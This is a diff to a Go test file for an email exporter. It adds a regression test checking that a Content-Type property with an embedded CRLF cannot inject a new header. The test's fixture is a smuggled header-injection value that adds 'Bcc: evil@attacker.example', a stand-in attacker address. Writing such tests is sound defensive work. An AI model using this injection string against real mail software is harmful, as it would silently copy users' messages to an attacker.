@@ -79,6 +79,27 @@ func TestExportOpaqueCarriesThePKCS7Object(t *testing.T) {
 	}
 }
 
+// TestOpaqueContentTypeCannotInjectHeaders stores a Content-Type with a line
+// break, the client-written value an opaque message goes out under. RFC 5322 2.2
+// ends a field at CRLF, so the break must not start a field of its own.
+func TestOpaqueContentTypeCannotInjectHeaders(t *testing.T) {
+	msg := smimeMessage("IPM.Note.SMIME", smimeAttachment("application/pkcs7-mime", []byte{0x30, 0x00}))
+	msg.Props.Set(mapi.MakeTag(0x8100, mapi.PtUnicode), "application/pkcs7-mime\r\nBcc: evil@attacker.example")
+	resolver := func(_ bool, names []mapi.PropertyName) ([]uint16, error) {
+		if len(names) == 1 && names[0] == mapi.NameInternetContentType {
+			return []uint16{0x8100}, nil
+		}
+		return make([]uint16, len(names)), nil
+	}
+	raw, err := Export(msg, Options{Resolver: resolver})
+	mustNoErr(t, err, "export")
+	for line := range strings.SplitSeq(string(raw), "\r\n") {
+		if strings.HasPrefix(line, "Bcc:") {
+			t.Errorf("the stored Content-Type started a header field:\n%s", raw)
+		}
+	}
+}
+
 // TestMalformedSMIMEIsRefusedForSendingAndReadableStored keeps a malformed S/MIME
 // object from going out, while its stored copy still renders as a notice.
 func TestMalformedSMIMEIsRefusedForSendingAndReadableStored(t *testing.T) {
